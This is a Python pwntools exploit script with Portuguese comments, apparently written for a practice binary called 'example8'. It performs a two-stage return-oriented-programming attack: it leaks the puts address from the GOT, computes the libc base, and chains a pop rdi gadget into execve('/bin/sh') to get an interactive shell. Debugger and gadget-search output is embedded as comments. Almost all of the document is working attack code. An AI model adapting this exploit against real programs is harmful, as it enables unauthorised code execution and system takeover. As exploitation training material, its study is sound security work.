#!/usr/bin/python3
from pwn import *


#analise estatica: 

"""

 #>aslr off base=0x00007ffff7dcf000 (obtido com vmmap)

gef➤  disas execve
Dump of assembler code for function execve:
   0x00007ffff7eb52f0 <+0>:     endbr64
   0x00007ffff7eb52f4 <+4>:     mov    eax,0x3b
   0x00007ffff7eb52f9 <+9>:     syscall

gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f6c000-0x7ffff7fb6000), permission=r--
  0x7ffff7f865aa - 0x7ffff7f865b1  →   "/bin/sh"
gef➤  disas puts
   0x00007ffff7e565a0 <+0>:     endbr64
   ....

#gadgets
#ropper --file example8 --search "pop"

0x00000000004011f1: pop rsi; pop r15; ret;
0x00000000004011f3: pop rdi; ret;


gef➤  disas main
Dump of assembler code for function main:
...
   0x0000000000401169 <+19>:    call   0x401050 <puts@plt>
...
End of assembler dump.
gef➤  x/2i 0x401050
   0x401050 <puts@plt>: endbr64
   0x401054 <puts@plt+4>:       bnd jmp QWORD PTR [rip+0x2fbd]        # 0x404018 <puts@got.plt>
gef➤  x/1gx 0x404018
0x404018 <puts@got.plt>:        0x0000000000401030
"""

def parseBytesLeaked(leaked):
  #remove trailing
  leaked=leaked.replace(b"\nhello world",b"")
  #remove first \n
  leaked=leaked[1:]
  leaked = int.from_bytes(leaked, "little")
  print("addr extracted",hex(leaked))

  #obtido da analise estatica
  putsOffset = 0x00007ffff7e565a0 - 0x00007ffff7dcf000
  base = leaked - putsOffset

  print("[BASE EM] ",hex(base))
  return base

pop_rdi = p64(0x00000000004011f3)
pop_rsi_r15 = p64(0x00000000004011f1)
shellStringOffset  = 0x7ffff7f865aa - 0x00007ffff7dcf000
execveOffset = 0x00007ffff7eb52f0-0x00007ffff7dcf000
main = p64(0x401156)
puts_got=p64(0x404018)
puts_plt=p64(0x401050)

#cria um processo e se conecta a ele
p = process("example8")

#primeiro payload leaka o endereço da puts presente na got
payload_round1 = b"\x90"*40 + pop_rdi + puts_got + puts_plt + main





#first hello world
p.recvuntil("hello world")

#leaker payload
p.sendline(payload_round1)

#parse bytes leaked
x = p.recvuntil("hello world")
print("bytes leaked",x)
base = parseBytesLeaked(x)

shellString = p64(base + shellStringOffset)
execveAddr  = p64(base + execveOffset)

payload_round2 = b"\x90"*40 + pop_rdi + shellString + pop_rsi_r15  +p64(0) +p64(0) + execveAddr



input("Round2?")
p.sendline(payload_round2)


input("Interactive?")
p.interactive()



